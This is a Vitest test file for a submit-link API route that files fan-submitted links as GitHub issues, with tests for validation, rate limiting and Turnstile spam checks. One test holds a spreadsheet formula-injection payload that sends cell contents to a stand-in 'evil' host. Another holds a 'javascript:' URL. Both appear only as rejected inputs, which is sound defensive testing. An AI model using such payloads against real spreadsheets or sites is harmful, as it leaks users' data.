import { afterEach, describe, expect, it, vi } from 'vitest';
import { POST, __rateLimiterSizeForTests } from './route';

// Each test gets its own client IP — the route's rate limiter is a module-
// level Map keyed by IP, and would otherwise leak state between test cases.
const req = (body: unknown, ip: string) =>
  new Request('http://localhost/api/submit-link', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-forwarded-for': ip },
    body: JSON.stringify(body),
  });

afterEach(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
});

describe('POST /api/submit-link', () => {
  it('accepts a valid submission and returns success', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ number: 1, html_url: 'http://gh/1' }), { status: 201 }),
    );
    vi.stubGlobal('fetch', fetchSpy);

    const res = await POST(req({ url: 'https://reddit.com/r/TaylorSwift', section: 'community' }, '10.0.0.1'));
    expect(res.status).toBe(200);
    const json = await res.json();
    expect(json).toMatchObject({ ok: true, number: 1, url: 'http://gh/1' });
    expect(fetchSpy).toHaveBeenCalledTimes(1);
  });

  it('rejects a non-http(s) scheme with 400', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await POST(req({ url: 'javascript:alert(1)', section: 'community' }, '10.0.0.2'));
    expect(res.status).toBe(400);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rejects a missing section with 400', async () => {
    const res = await POST(req({ url: 'https://reddit.com/r/x' }, '10.0.0.3'));
    expect(res.status).toBe(400);
  });

  it('rejects a section outside the community/merch enum with 400', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await POST(req({ url: 'https://reddit.com/r/x', section: 'clowning' }, '10.0.0.30'));
    expect(res.status).toBe(400);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it.each(['community', 'merch'])('accepts the %s section', async (section) => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue(new Response(JSON.stringify({ number: 1 }), { status: 201 })),
    );
    const res = await POST(req({ url: 'https://reddit.com/r/x', section }, `10.0.0.${section}`));
    expect(res.status).toBe(200);
  });

  it('ignores a note/sourcePage in the request body — they are not a supported input', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ number: 9, html_url: 'http://gh/9' }), { status: 201 }),
    );
    vi.stubGlobal('fetch', fetchSpy);

    const res = await POST(
      req(
        {
          url: 'https://reddit.com/r/x',
          section: 'community',
          note: '=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")',
          sourcePage: 'https://attacker.example',
        },
        '10.0.0.31',
      ),
    );
    expect(res.status).toBe(200);

    const [, init] = fetchSpy.mock.calls[0];
    const sent = JSON.parse(init.body as string);
    expect(sent.body).not.toContain('IMPORTXML');
    expect(sent.body).not.toContain('attacker.example');
    expect(sent.body).toContain('/community');
  });

  it('drops honeypot submissions silently (200, nothing written)', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await POST(
      req({ url: 'https://reddit.com/r/x', section: 'community', hp: 'i am a bot' }, '10.0.0.4'),
    );
    expect(res.status).toBe(200);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rate-limits bursts from the same client', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue(new Response(JSON.stringify({ number: 1 }), { status: 201 })),
    );

    let last: Response | undefined;
    for (let i = 0; i < 7; i += 1) {
      last = (await POST(
        req({ url: `https://reddit.com/r/x?i=${i}`, section: 'community' }, '10.0.0.5'),
      )) as Response;
    }
    expect(last?.status).toBe(429);
  });

  it('still succeeds and still files the GitHub issue when the sheet webhook is unconfigured', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    const fetchSpy = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ number: 2, html_url: 'http://gh/2' }), { status: 201 }),
    );
    vi.stubGlobal('fetch', fetchSpy);

    const res = await POST(req({ url: 'https://etsy.com/shop/x', section: 'merch' }, '10.0.0.6'));
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ ok: true, number: 2 });
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    expect(fetchSpy.mock.calls[0][0]).toContain('api.github.com');
  });

  it('still succeeds and still files the GitHub issue when email is unconfigured', async () => {
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
    const fetchSpy = vi.fn().mockImplementation((url: string) => {
      if (url.includes('api.github.com')) {
        return Promise.resolve(
          new Response(JSON.stringify({ number: 3, html_url: 'http://gh/3' }), { status: 201 }),
        );
      }
      return Promise.resolve(new Response('{}', { status: 200 }));
    });
    vi.stubGlobal('fetch', fetchSpy);

    const res = await POST(req({ url: 'https://discord.gg/x', section: 'community' }, '10.0.0.7'));
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ ok: true, number: 3 });
    // GitHub issue + sheet webhook both attempted; email skipped (unconfigured).
    expect(fetchSpy).toHaveBeenCalledTimes(2);
  });

  it('still succeeds (no crash) even when GitHub itself is unconfigured', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    const res = await POST(req({ url: 'https://reddit.com/r/x', section: 'community' }, '10.0.0.8'));
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ ok: true });
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('still returns 200 within the timeout when the always-on GitHub fetch hangs', async () => {
    vi.useFakeTimers();
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal(
      'fetch',
      vi.fn((_url: string, init?: RequestInit) => {
        return new Promise((_resolve, reject) => {
          init?.signal?.addEventListener('abort', () => {
            reject(new DOMException('The operation was aborted.', 'AbortError'));
          });
        });
      }),
    );

    const promise = POST(req({ url: 'https://reddit.com/r/x', section: 'community' }, '10.0.0.9'));
    await vi.advanceTimersByTimeAsync(5100);
    const res = await promise;

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ ok: true });
    vi.useRealTimers();
  });

  // Turnstile spam gate. THE ASYMMETRY BEING TESTED HERE IS THE WHOLE POINT:
  // unset secret → behaves exactly as before Turnstile existed (fail open,
  // matching the sinks' philosophy); set secret → verification is mandatory
  // and fails CLOSED on any error, timeout, or bad token (the opposite of
  // the sinks). See verifyTurnstile's doc comment in lib/longlive/submit-link.ts.
  describe('Turnstile spam gate', () => {
    it('behaves exactly as before Turnstile when TURNSTILE_SECRET_KEY is unset (no token needed)', async () => {
      vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
      const fetchSpy = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ number: 10, html_url: 'http://gh/10' }), { status: 201 }),
      );
      vi.stubGlobal('fetch', fetchSpy);

      const res = await POST(req({ url: 'https://reddit.com/r/x', section: 'community' }, '10.3.0.1'));
      expect(res.status).toBe(200);
      // Only the GitHub sink fetch — no siteverify call was made.
      expect(fetchSpy).toHaveBeenCalledTimes(1);
      expect(fetchSpy.mock.calls[0][0]).toContain('api.github.com');
    });

    it('rejects a submission with no token when TURNSTILE_SECRET_KEY is set', async () => {
      vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
      vi.stubEnv('TURNSTILE_SECRET_KEY', 'secret');
      const fetchSpy = vi.fn();
      vi.stubGlobal('fetch', fetchSpy);

      const res = await POST(req({ url: 'https://reddit.com/r/x', section: 'community' }, '10.3.0.2'));
      expect(res.status).toBe(400);
      // Rejected before any sink or siteverify call.
      expect(fetchSpy).not.toHaveBeenCalled();
    });

    it('rejects an invalid/failed token when TURNSTILE_SECRET_KEY is set', async () => {
      vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
      vi.stubEnv('TURNSTILE_SECRET_KEY', 'secret');
      const fetchSpy = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ success: false, 'error-codes': ['invalid-input-response'] }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchSpy);

      const res = await POST(
        req({ url: 'https://reddit.com/r/x', section: 'community', token: 'bad-token' }, '10.3.0.3'),
      );
      expect(res.status).toBe(400);
      expect(fetchSpy).toHaveBeenCalledTimes(1);
      expect(fetchSpy.mock.calls[0][0]).toContain('challenges.cloudflare.com');
    });

    it('accepts a valid token when TURNSTILE_SECRET_KEY is set', async () => {
      vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
      vi.stubEnv('TURNSTILE_SECRET_KEY', 'secret');
      const fetchSpy = vi.fn().mockImplementation((url: string) => {
        if (url.includes('challenges.cloudflare.com')) {
          return Promise.resolve(new Response(JSON.stringify({ success: true }), { status: 200 }));
        }
        return Promise.resolve(
          new Response(JSON.stringify({ number: 11, html_url: 'http://gh/11' }), { status: 201 }),
        );
      });
      vi.stubGlobal('fetch', fetchSpy);

      const res = await POST(
        req({ url: 'https://reddit.com/r/x', section: 'community', token: 'good-token' }, '10.3.0.4'),
      );
      expect(res.status).toBe(200);
      expect(await res.json()).toMatchObject({ ok: true, number: 11 });
      expect(fetchSpy).toHaveBeenCalledTimes(2);
    });

    it('rejects (never allows) when the siteverify call itself errors', async () => {
      vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
      vi.stubEnv('TURNSTILE_SECRET_KEY', 'secret');
      const fetchSpy = vi.fn().mockImplementation((url: string) => {
        if (url.includes('challenges.cloudflare.com')) {
          return Promise.reject(new Error('network down'));
        }
        return Promise.resolve(new Response(JSON.stringify({ number: 12 }), { status: 201 }));
      });
      vi.stubGlobal('fetch', fetchSpy);

      const res = await POST(
        req({ url: 'https://reddit.com/r/x', section: 'community', token: 'some-token' }, '10.3.0.5'),
      );
      expect(res.status).toBe(400);
      // Only the failed siteverify call — never reached the GitHub sink.
      expect(fetchSpy).toHaveBeenCalledTimes(1);
    });
  });

  it('evicts stale IPs from the rate limiter map instead of growing it forever', async () => {
    vi.useFakeTimers();
    // Pin the fake clock to the real current time — the limiter's internal
    // `lastSweep` was recorded with the real Date.now() at module load, and
    // the sweep-due check compares against it, so the fake clock's starting
    // point has to agree with that rather than default to the epoch.
    vi.setSystemTime(new Date());
    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue(new Response(JSON.stringify({ number: 1 }), { status: 201 })),
    );

    // 20 distinct one-off IPs, one hit each — under the burst limit, so
    // nothing 429s, but each adds a key to the limiter's internal map.
    // Measured relative to whatever the map already holds from earlier
    // tests in this file (the map is module-level and not reset per test).
    const before = __rateLimiterSizeForTests();
    for (let i = 0; i < 20; i += 1) {
      // eslint-disable-next-line no-await-in-loop
      await POST(req({ url: `https://reddit.com/r/x?i=${i}`, section: 'community' }, `10.2.0.${i}`));
    }
    expect(__rateLimiterSizeForTests()).toBe(before + 20);

    // Advance past both the rate-limit window and the sweep interval, then
    // send one more request. Every entry present up to that point (the
    // pre-existing ones and the 20 just added) is now older than the
    // window, so the sweep this request triggers should drop all of them,
    // leaving only the one this final request itself just added.
    vi.advanceTimersByTime(6 * 60_000);
    await POST(req({ url: 'https://reddit.com/r/x?final=1', section: 'community' }, '10.2.0.99'));
    expect(__rateLimiterSizeForTests()).toBe(1);

    vi.useRealTimers();
  });
});
